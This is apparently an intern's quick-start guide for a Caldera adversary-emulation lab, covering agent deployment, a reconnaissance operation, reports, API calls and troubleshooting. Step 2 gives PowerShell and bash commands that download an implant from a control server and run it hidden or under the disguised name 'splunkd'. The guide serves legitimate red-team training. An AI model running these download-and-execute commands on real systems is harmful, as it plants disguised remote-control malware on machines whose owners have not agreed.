---

**⚠️ INTERNSHIP PROJECT DOCUMENTATION**

This document describes quick-start instructions for an internship project completed during a Triskele Labs internship (January-February 2026) by Tony To. This is educational documentation for portfolio purposes, NOT official Triskele Labs documentation.

**Status**: Learning Exercise | **NOT FOR**: Production Use

See [INTERNSHIP_DISCLAIMER.md](../../INTERNSHIP_DISCLAIMER.md) for complete information.

---

# Quick Start Guide

## Overview

Get operational with this internship project in 10 minutes. This guide walks you through your first agent deployment and operation execution for learning and demonstration purposes.

## Prerequisites

- Installation complete (see [Installation Guide](installation.md))
- Server running on `http://localhost:8888`
- Administrative access to the web interface

## Step 1: Access the Web Interface

Open your browser and navigate to:

```
http://localhost:8888
```

Log in with default credentials (change these immediately):
- **Username:** admin
- **Password:** admin

## Step 2: Deploy Your First Agent

### Access Agent Deployment

1. Navigate to **Campaigns** > **Agents**
2. Click **Deploy Agent** button

### Select Platform Configuration

Choose the appropriate settings for your target system:

**For Windows:**
- Platform: `windows`
- Agent: `sandcat`
- Contact: `HTTP`
- Server: `http://<YOUR_SERVER_IP>:8888`

**For Linux/macOS:**
- Platform: `linux` or `darwin`
- Agent: `sandcat`
- Contact: `HTTP`
- Server: `http://<YOUR_SERVER_IP>:8888`

### Execute Deployment Command

#### Windows (PowerShell)

```powershell
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
Get-Process | ? {$_.Path -like "*$name*"} | Stop-Process -Force -ErrorAction SilentlyContinue;
rm -force "C:\Users\Public\$name" -ErrorAction SilentlyContinue;
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name -ArgumentList "-server $server -group red" -WindowStyle Hidden;
```

#### Linux/macOS (Bash)

```bash
server="http://192.168.1.100:8888";
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

### Verify Agent Connection

Return to the **Agents** page. Within 60 seconds, you should see your agent listed with:
- Hostname
- Platform
- IP address
- Group assignment (`red`)

## Step 3: Create Your First Operation

### Navigate to Operations

1. Click **Campaigns** > **Operations**
2. Click **Create Operation**

### Configure Operation

Fill in the operation parameters:

| Field | Recommended Value | Description |
|-------|-------------------|-------------|
| Name | `TEST-DISCOVERY-001` | Unique operation identifier |
| Adversary | `Discovery` | Pre-built adversary profile |
| Group | `red` | Target agent group |
| Planner | `atomic` | Sequential execution planner |
| Fact Source | `basic` | Default fact source |
| Auto-close | Enabled | Automatically finish when complete |
| Obfuscator | `plain-text` | No obfuscation (for testing) |

### Select Adversary Profile

Choose **Discovery** from the adversary dropdown. This profile includes basic reconnaissance techniques:

- System Network Configuration Discovery (T1016)
- System Information Discovery (T1082)
- File and Directory Discovery (T1083)
- Process Discovery (T1057)

### Start the Operation

1. Click **Create** to initialise the operation
2. Click **Start** to begin execution

## Step 4: Monitor Operation Progress

### Operation Dashboard

The operation dashboard displays:
- **Status** - Current state (running, paused, finished)
- **Progress** - Percentage of abilities executed
- **Links** - Individual command executions
- **Facts** - Discovered information

### Real-Time Updates

Watch as the operation executes techniques:
- Green indicators show successful execution
- Yellow indicates waiting for prerequisites
- Red shows blocked or failed techniques

### Typical Timeline

For the Discovery adversary profile:
- **0-30 seconds** - Initial abilities execute
- **30-90 seconds** - Fact collection and dependent abilities
- **90-120 seconds** - Operation completion

## Step 5: Review Results

### View Executed Commands

1. Click on the operation name to expand details
2. Review the **Links** section for all executed commands
3. Click individual links to see:
   - Command executed
   - Output captured
   - Execution timestamp
   - Success/failure status

### Analyse Collected Facts

Navigate to **Advanced** > **Sources** to view discovered facts:
- Host information
- Network configuration
- User accounts
- Running processes

## Step 6: Generate Report

### Access Reporting

1. Return to **Operations** page
2. Locate your completed operation
3. Click **Generate Report**

### Report Options

Select report format:
- **PDF** - Executive presentation
- **JSON** - Programmatic integration
- **HTML** - Web embedding

### Download Report

The generated report includes:
- Executive summary
- Techniques executed
- Success rate metrics
- Detailed command output
- Discovered facts

## Common First-Time Tasks

### Change Admin Password

1. Navigate to **Settings** > **Users**
2. Select **admin** user
3. Click **Change Password**
4. Enter new password twice
5. Click **Save**

### Create Additional Users

1. Go to **Settings** > **Users**
2. Click **Add User**
3. Specify username, password, and permissions
4. Assign appropriate roles (red team, blue team, observer)

### Import Additional Abilities

1. Navigate to **Advanced** > **Abilities**
2. Click **Import**
3. Select YAML ability definitions
4. Review and confirm import

### Configure Adversary Profiles

1. Go to **Campaigns** > **Adversaries**
2. Click **Create Adversary**
3. Add abilities to build custom attack sequences
4. Save for future operations

## Automation with Scripts

### Start Full Environment

```bash
# Start ELK Stack and Caldera
./scripts/tl-startup.sh
```

The script performs:
- Resource validation (4GB+ RAM check)
- ELK stack initialisation
- Health checks
- Caldera server startup

### Check System Status

```bash
# View all service statuses
./scripts/tl-status.sh
```

Output shows:
- Elasticsearch status
- Kibana status
- Logstash status
- Caldera server status
- Port availability

### Graceful Shutdown

```bash
# Stop all services in correct order
./scripts/tl-shutdown.sh
```

Shutdown sequence:
1. Stop Caldera server
2. Stop ELK Stack components
3. Clean up temporary files

## API Quick Reference

### Create Operation via API

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "Content-Type: application/json" \
  -d '{
    "name": "API-TEST-001",
    "adversary": {"adversary_id": "<adversary-uuid>"},
    "group": "red",
    "planner": {"id": "atomic"},
    "source": {"id": "basic"}
  }'
```

### Start Operation

```bash
curl -X PATCH http://localhost:8888/api/v2/operations/<operation-id> \
  -H "Content-Type: application/json" \
  -d '{"state": "running"}'
```

### Check Operation Status

```bash
curl http://localhost:8888/api/v2/operations/<operation-id> | jq '.state'
```

### List All Agents

```bash
curl http://localhost:8888/api/v2/agents | jq
```

## Troubleshooting

### Agent Not Appearing

**Check firewall rules:**
```bash
sudo ufw status
sudo ufw allow 8888/tcp
```

**Verify agent process:**
```bash
# Windows
Get-Process | Where-Object {$_.Name -like "*sandcat*"}

# Linux/macOS
ps aux | grep splunkd
```

### Operation Stuck at 0%

**Verify agent platform matches abilities:**
1. Check agent platform in Agents page
2. Review adversary abilities for platform compatibility
3. Ensure abilities exist for the agent's platform

**Check agent connectivity:**
```bash
curl http://localhost:8888/api/v2/agents/<agent-paw>/heartbeat
```

### Cannot Access Web Interface

**Verify server is running:**
```bash
lsof -ti:8888
curl http://localhost:8888/api/v2/health
```

**Check server logs:**
```bash
tail -f logs/caldera.log
```

## Next Steps

Now that you have completed your first operation:

- [Agent Management](../user-guide/agents.md) - Advanced agent deployment techniques
- [Running Operations](../user-guide/operations.md) - Complex operation configuration
- [Platform Overview](../user-guide/overview.md) - Understanding the architecture
- [API Reference](../technical/api-reference.md) - Programmatic integration

## See Also

- [Configuration Reference](configuration.md) - Detailed configuration options
- [Deployment Guide](../deployment/local-deployment.md) - Development environment setup
- [Troubleshooting](../deployment/troubleshooting.md) - Common issues and solutions
